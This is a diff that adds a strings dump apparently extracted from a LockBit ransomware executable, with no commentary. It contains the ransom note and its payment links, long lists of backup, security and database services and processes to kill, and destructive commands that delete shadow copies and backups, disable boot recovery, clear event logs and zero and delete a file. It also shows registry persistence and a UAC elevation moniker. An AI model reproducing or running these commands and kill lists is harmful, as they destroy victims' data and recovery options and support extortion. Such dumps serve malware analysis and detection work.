@@ -1,0 +1,637 @@
+!This program cannot be run in DOS mode.
+`.rdata
+@.data
+A,0b/-
+A00'b+
+A4,$-0
+A8/#6+
+A<-,b1
+AD'16-
+AP.'1l
+AT6:6b
+AX6*#6
+A\b+1b
+A0AHMF
+A4^JFY
+A<EL]L
+ADJMLM
+APRMLO
+ATH\E]
+A\F]Z]
+A =2Lh
+A `u`a
+A$gd{x
+A(}wm4
+A,}sz{
+A0fqux
+A4xru}
+A8xafqf
+A 80.+
+A(XQ@Q
+A,{XPQf
+A Q^WSf
+A cb,x
+A(|mki
+A4,Xd~
+A8cykd
+A<,m,X
+A@c~,N
+AHi~,!
+AL,~io
+APcaai
+ATbhih
+A\=",H
+A$EAW@
+A<[\AF
+A@@GQF
+AD[]\A
+ALFZ[A
+ATW?8?
+u29Cp~
+t0_^[]
+t0_^[]
+\SVWh0iB
+DL(2D$&f
+D$!bPfk
+D$%kwfwf
+:ineIu
+:ntelt
+:Authu
+:entiu
+:cAMDt
+Z2D$:2L$:
+^2D$#3
+d$Z2D$h
+tv_^f;
+@hpSVWt
+uGh`yB
+D$Fu0;4
+D$J7901
+L&&jl66Z~??A
+Oh44\Q
+sb11S*
+uB!!c 
+D""fT**~;
+;d22Vt::N
+J%%o\..r8
+gg}V++
+jL&&Zl66A~??
+Sb11?*
+tX,,.4
+RRMv;;a
+MMUf33
+PPDx<<
+cB!!0 
+~~Gz==
+fD""~T**
+Vd22Nt::
+xxoJ%%r\..$8
+tt!>
+ppB|>>
+aa_j55
+UUxP((z
+&jL&6Zl6?A~?
+~=Gz=d
+"fD"*~T*
+2Vd2:Nt:
+x%oJ%.r\.
+t!>K
+a5_j5W
+=&&jL66Zl??A~
+g99KrJJ
+==Gzdd
+""fD**~T
+22Vd::Nt
+$$lH\\
+77Ynmm
+%%oJ..r\
+!>KK
+55_jWW
+[T:$6.
+[.:$6g
+j_FbT~
+h4,8$@_
+2\tHlWB
+PQAeS~
+~4[C)v
+08:15:10
+08:15:10
+ShutdownBlockReasonCreate
+user32
+LockBit Ransom
+[%.2u:%.2u:%.2u] 
+08:15:10
+%S %s total / %s free
+threads closed, waiting handles...
+Cleanup
+%ld files encrypted; speed %ld files/sec
+08:15:10
+WallpaperStyle
+TileWallpaper
+Control Panel\Desktop
+SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><meta http-equiv="x-ua-compatible" content="ie=9"><title>LockBit</title><hta:application id=LockBit applicationName=LockBit icon=explorer.exe selection=no scroll=no contextmenu=no innerBorder=no windowState=maximize minimizeButton=no singleInstance=yes sysMenu=no /><link rel="stylesheet" href="public/css/test.css"><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>html{font-size:100%}body{position:relative;border:0;font-family:Arial;padding:1% 0 0 0;margin:0;width:100vw;height:100vh;overflow:hidden}*{font-size:1rem}.g1{content:"";position:absolute;left:0;top:50%;transform:translateY(-50%);height:368px;width:150px;z-index:-1}.g2{z-index:-1;content:"";position:absolute;right:0;top:50%;transform:translateY(-50%);height:368px;width:150px}.container{width:90%;margin:auto}.container img{max-width:100%}.ht{margin-bottom:1%;position:relative;padding-left:16px;font-weight:900;font-size:1rem;line-height:100%;letter-
+All your files are encrypted by LockBit
+For more information see Restore-My-Files.txt that is located in every encrypted folder
+08:15:10
+08:15:10
+Global\{02B49784-1CA2-436C-BC08-72FA3956507D}
+Global\{BEF590BE-11A6-442A-A85B-656C1081E04C}
+SeDebugPrivilege
+Debug Privilege: OK
+08:15:10
+Local time: %d.%d %d:%d
+PC: %s
+08:15:12
+Removed autorun key
+SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+Service %s stopped
+wrapper
+DefWatch
+ccEvtMgr
+ccSetMgr
+SavRoam
+Sqlservr
+sqlagent
+sqladhlp
+Culserver
+RTVscan
+sqlbrowser
+SQLADHLP
+QBIDPService
+Intuit.QuickBooks.FCS
+QBCFMonitorService
+sqlwriter
+msmdsrv
+tomcat6
+zhudongfangyu
+vmware-usbarbitator64
+vmware-converter
+dbsrv12
+dbeng8
+MSSQL$MICROSOFT##WID
+MSSQL$VEEAMSQL2012
+SQLAgent$VEEAMSQL2012
+SQLBrowser
+SQLWriter
+FishbowlMySQL
+MSSQL$MICROSOFT##WID
+MySQL57
+MSSQL$KAV_CS_ADMIN_KIT
+MSSQLServerADHelper100
+SQLAgent$KAV_CS_ADMIN_KIT
+msftesql-Exchange
+MSSQL$MICROSOFT##SSEE
+MSSQL$SBSMONITORING
+MSSQL$SHAREPOINT
+MSSQLFDLauncher$SBSMONITORING
+MSSQLFDLauncher$SHAREPOINT
+SQLAgent$SBSMONITORING
+SQLAgent$SHAREPOINT
+QBFCService
+YooBackup
+MSSQL$
+memtas
+mepocs
+sophos
+backup
+PDVFSService
+BackupExecVSSProvider
+BackupExecAgentAccelerator
+BackupExecAgentBrowser
+BackupExecDiveciMediaService
+BackupExecJobEngine
+BackupExecManagementService
+BackupExecRPCService
+MVArmor
+MVarmor64
+stc_raw_agent
+VSNAPVSS
+VeeamTransportSvc
+VeeamDeploymentService
+VeeamNFSSvc
+AcronisAgent
+AcrSch2Svc
+CASAD2DWebSvc
+CAARCUpdateSvc
+WSBExchange
+MSExchange
+MSExchange$
+Service %s stopped
+Service %s stopped
+Service %s stopped
+cmd.exe
+/c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet
+wxServer
+wxServerView
+sqlmangr
+supervise
+Culture
+Defwatch
+winword
+QBDBMgr
+qbupdate
+axlbridge
+fdlauncher
+MsDtSrvr
+360doctor
+wdswfsafe
+fdhost
+GDscan
+ZhuDongFangYu
+QBDBMgrN
+mysqld
+AutodeskDesktopApp
+acwebbrowser
+Creative Cloud
+Adobe Desktop Service
+CoreSync
+Adobe CEF Helper
+AdobeIPCBroker
+sync-taskbar
+sync-worker
+InputPersonalization
+AdobeCollabSync
+BrCtrlCntr
+BrCcUxSys
+SimplyConnectionManager
+Simply.SystemTrayIcon
+fbguard
+fbserver
+ONENOTEM
+wsa_service
+koaly-exp-engine-service
+TeamViewer_Service
+TeamViewer
+tv_w32
+tv_x64
+TitanV
+notepad
+RdrCEF
+oracle
+dbsnmp
+synctime
+agntsvc
+isqlplussvc
+xfssvccon
+mydesktopservice
+ocautoupds
+encsvc
+firefox
+tbirdconfig
+mydesktopqos
+dbeng50
+sqbcoreservice
+infopath
+msaccess
+onenote
+outlook
+powerpnt
+thebat
+thunderbird
+wordpad
+benetns
+bengien
+pvlsvr
+beserver
+raw_agent_svc
+vsnapvss
+CagService
+DellSystemDetect
+EnterpriseClient
+VeeamDeploymentSvc
+Killed process: %s [pid: %ld]
+Wow64DisableWow64FsRedirection
+kernel32
+/c vssadmin Delete Shadows /All /Quiet
+/c bcdedit /set {default} recoveryenabled No
+/c bcdedit /set {default} bootstatuspolicy ignoreallfailures
+/c wbadmin DELETE SYSTEMSTATEBACKUP
+/c wbadmin DELETE SYSTEMSTATEBACKUP -deleteOldest
+/c wmic SHADOWCOPY /nointeractive
+/c wevtutil cl security
+/c wevtutil cl system
+/c wevtutil cl application
+Volume Shadow Copy & Event log clean
+Wow64RevertWow64FsRedirection
+kernel32
+08:15:12
+Process created with limited rights
+08:15:12
+Volume %S mounted to %S
+08:15:10
+WTSQueryUserToken
+Wtsapi32.dll
+WTSGetActiveConsoleSessionId
+Wtsapi32.dll
+08:15:14
+RtlFreeUnicodeString
+RtlDosPathNameToNtPathName_U_WithStatus
+10:29:28
+SOFTWARE\LockBit
+Public
+ Getting session keys from registry
+Public
+ Generate session keys
+ AES-NI support enabled
+ IOCP initialized!
+All your important files are encrypted!
+Any attempts to restore your files with the thrid-party software will be fatal for your files!
+RESTORE YOU DATA POSIBLE ONLY BUYING private key from us.
+There is only one way to get your files back:
+1) Through a standard browser(FireFox, Chrome, Edge, Opera)
+| 1. Open link http://lockbit-decryptor.top/?
+| 2. Follow the instructions on this page
+2) Through a Tor Browser - recommended
+| 1. Download Tor browser - https://www.torproject.org/ and install it.
+| 2. Open link in TOR browser - http://lockbitks2tvnmwk.onion/?
+ Starting IO threads...
+Unable to bind NOTE file IOCP %S error: %d
+ This link only works in Tor Browser! 
+| 3. Follow the instructions on this page
+ ###  Attention! ###
+ # lockbit-decryptor.top may be blocked. We recommend using a Tor browser to access the site
+ # Do not rename encrypted files.
+ # Do not try to decrypt using third party software, it may cause permanent data loss.
+ # Decryption of your files with the help of third parties may cause increased price(they add their fee to our).
+ # Tor Browser may be blocked in your country or corporate network. Use https://bridges.torproject.org or use Tor Browser over VPN.
+ # Tor Browser user manual https://tb-manual.torproject.org/about
+\Restore-My-Files.txt
+08:15:14
+0.0.0.0
+Local subnet %s.0/24
+WS2_32
+inet_addr
+gethostbyaddr
+08:15:15
+/c@LDmF[
+}NA\@B
+ caarcuPDATEsVC
+BCryptGenRandom
+Cfm`gKRA@pmigp
+J|qqm|mxoNidqx
+xX17;(X
+O,*)O'
+#dOLABO
+o< );8.=*3"
+l?#*8;->)0!
+u& %%:'!A
+(7$"k&88:'O8)8&$%"?$F
+.&$=./k*>?$9>%G
+)32.3i
+ 61*7 h
+,)}0..,1Y04>/2.2;)J
+/89%$+&#0a20- 
+E2) 3$1C
+"6- +&1
+iuox|yn=~qrnxy1a,220-E,("3.2.'5O
+ !&; =
+-8$'1%-&<)zfo}~h{lueFJBk@
+GayQzfEta}[txpA*GYL^OY[F
+oRIBKD
+DZZXE-ZAH[LYF@G/|JkJMZH
+]FYFCJH/b||~c|J]YJ]nkgJ
+}vl<N]]YUK+iJH@^[nSNHfJEJL>m[JKN
+I_RRN_N[L
+TJJHU=TPZKVJV_M#aB@HVSf[F@uppsQ0cXEDT_G^r\_S[bU&uCTPOEC
+QOOMP8W]JC_OC]X|7
+\n#==?"J8++/#=?"\
+tuc{Tuc{d
+Fpgc|vp50f5faze
+F83/h'83/h'83/h
+Ab`hvsF{f`IlaFm
+[xzrli\a|zX~|wm>mor
+ha}m=j|titsz=u|syqxn0w\_RQ\lKruv
+`{awds;uyx`sdbs
+IsVrbu~Niahujfs
+Qhkrjb'"T'jhris
+KUUWJ@BJgshenct
+Xy~i{<Lnujupy{y]~|tjoZgz|MO\Lzz[aEta}[txpJ@JB|/}[Ci]JJzAFL@KJ|
+]k|xgmk.+}.}za~,zIIMAx^MB_\C^X
+NetShareEnum
+NetApiBufferFree
+NETAPI32.dll
+GetAdaptersInfo
+IPHLPAPI.DLL
+WS2_32.dll
+CryptBinaryToStringA
+CRYPT32.dll
+GdipSaveImageToFile
+GdipSetStringFormatAlign
+GdipCreateBitmapFromScan0
+GdipDeleteFont
+GdipDeleteStringFormat
+GdipDeleteGraphics
+GdipGetImageEncodersSize
+GdipGetImageGraphicsContext
+GdipCloneBrush
+GdipDrawString
+GdipFree
+GdipGetGenericFontFamilySansSerif
+GdipFillRectangle
+GdipCreateFont
+GdipSetStringFormatLineAlign
+GdipCreateLineBrushFromRect
+GdipDisposeImage
+GdipAlloc
+GdipDeleteBrush
+GdipCreateFontFamilyFromName
+GdipGetImageEncoders
+GdipDeleteFontFamily
+GdipCreateStringFormat
+GdiplusStartup
+gdiplus.dll
+StrFormatByteSize64A
+PathAddBackslashW
+PathFindExtensionW
+PathRemoveBackslashW
+PathRemoveExtensionA
+PathRemoveFileSpecW
+SHLWAPI.dll
+WNetCloseEnum
+WNetGetConnectionW
+WNetEnumResourceW
+WNetOpenEnumW
+WNetAddConnection2W
+MPR.dll
+RtlEnterCriticalSection
+RtlLeaveCriticalSection
+RtlDeleteCriticalSection
+RtlInitializeCriticalSection
+NtSetInformationThread
+NtAdjustPrivilegesToken
+NtOpenProcessToken
+NtQueryInformationToken
+RtlGetAce
+NtOpenProcess
+RtlQueryInformationAcl
+RtlAllocateAndInitializeSid
+RtlAddAce
+RtlLengthSid
+NtClose
+RtlAdjustPrivilege
+RtlFreeSid
+RtlAddAccessDeniedAce
+NtSetInformationProcess
+RtlCreateAcl
+NtWaitForSingleObject
+NtSetInformationFile
+RtlDosPathNameToNtPathName_U
+NtCreateIoCompletion
+NtRemoveIoCompletion
+NtQueryInformationFile
+RtlInterlockedPushEntrySList
+RtlInitializeSListHead
+RtlInterlockedPopEntrySList
+RtlInterlockedFlushSList
+RtlInitUnicodeString
+NtAllocateVirtualMemory
+LdrEnumerateLoadedModules
+RtlAcquirePebLock
+RtlReleasePebLock
+ntdll.dll
+malloc
+calloc
+msvcrt.dll
+SetConsoleCtrlHandler
+SetConsoleTextAttribute
+SetConsoleTitleA
+WriteFile
+SetConsoleMode
+SetProcessShutdownParameters
+GetModuleHandleA
+GetConsoleMode
+GetLocalTime
+GetProcAddress
+GetConsoleWindow
+AllocConsole
+GetLogicalDrives
+FindFirstFileExW
+FindNextFileW
+WaitForMultipleObjects
+SetThreadUILanguage
+FindClose
+CreateFileW
+GetFileAttributesW
+ExitThread
+SetFileAttributesW
+GetDiskFreeSpaceExW
+DeleteFileW
+CloseHandle
+CreateThread
+ExitProcess
+lstrcmpiW
+GetDriveTypeW
+GetTempPathW
+GetTempFileNameW
+GetTickCount
+CreateMutexA
+OpenMutexA
+LoadLibraryA
+Process32First
+GetSystemDefaultUILanguage
+TerminateProcess
+GetUserDefaultUILanguage
+OpenProcess
+CreateToolhelp32Snapshot
+Process32Next
+MoveFileExW
+GetCurrentProcessId
+lstrcmpiA
+CreateProcessA
+GetVersion
+QueryDosDeviceW
+FindFirstVolumeW
+SetVolumeMountPointW
+FindVolumeClose
+GetVolumePathNamesForVolumeNameW
+FindNextVolumeW
+ReadFile
+GlobalAlloc
+GlobalFree
+GetCurrentProcess
+GetWindowsDirectoryW
+KERNEL32.dll
+EnableMenuItem
+SetLayeredWindowAttributes
+FlashWindow
+RegisterHotKey
+wvsprintfA
+GetWindowLongA
+PeekMessageW
+SetWindowLongA
+ShowWindow
+wsprintfA
+DeleteMenu
+IsWindowVisible
+GetSystemMenu
+GetMessageW
+wsprintfW
+SystemParametersInfoW
+GetSystemMetrics
+GetShellWindow
+GetWindowThreadProcessId
+CharLowerBuffW
+CharUpperA
+MessageBoxA
+USER32.dll
+SetThreadToken
+RegQueryValueExW
+RegDeleteValueW
+RegSetValueExA
+RegSetValueExW
+RegCreateKeyExA
+RegOpenKeyA
+RegCloseKey
+CryptReleaseContext
+InitializeSecurityDescriptor
+CheckTokenMembership
+CreateWellKnownSid
+LookupPrivilegeValueA
+CryptGenRandom
+SetSecurityDescriptorOwner
+CryptAcquireContextW
+SetFileSecurityW
+OpenServiceA
+QueryServiceStatusEx
+ControlService
+OpenSCManagerA
+CloseServiceHandle
+EnumDependentServicesA
+GetSecurityInfo
+SetSecurityInfo
+GetTokenInformation
+OpenThreadToken
+DuplicateToken
+OpenProcessToken
+RegQueryValueExA
+ADVAPI32.dll
+CommandLineToArgvW
+SHEmptyRecycleBinW
+ShellExecuteW
+SHGetFolderPathW
+ShellExecuteExA
+ShellExecuteExW
+SHELL32.dll
+CoInitializeEx
+CoUninitialize
+CoGetObject
+ole32.dll
+jjjjjjjj
+image/bmp
+%s.bmp
+{2C5F9FCC-F266-43F6-BFD7-838DAE269E11}
+%s\LockBit-note.hta
+cmd.exe
+y /C ping 127.0.0.7 -n 3 > Nul & fsutil file setZeroData offset=0 length=524288 "%s" & Del /f /q "%s"
+XO1XADpO01
+winsta0\default
+\\%s\%s
+\explorer.exe
+\explorer.exe
+explorer.exe
+Elevation:Administrator!new:
+{3E5FC7F9-9A51-4367-9063-A120244FBEC7}
+DisplayCalibrator
+Software\Microsoft\Windows NT\CurrentVersion\ICM\Calibration
+{D2E7041B-2927-42fb-8E9F-7CE93B6DC937}
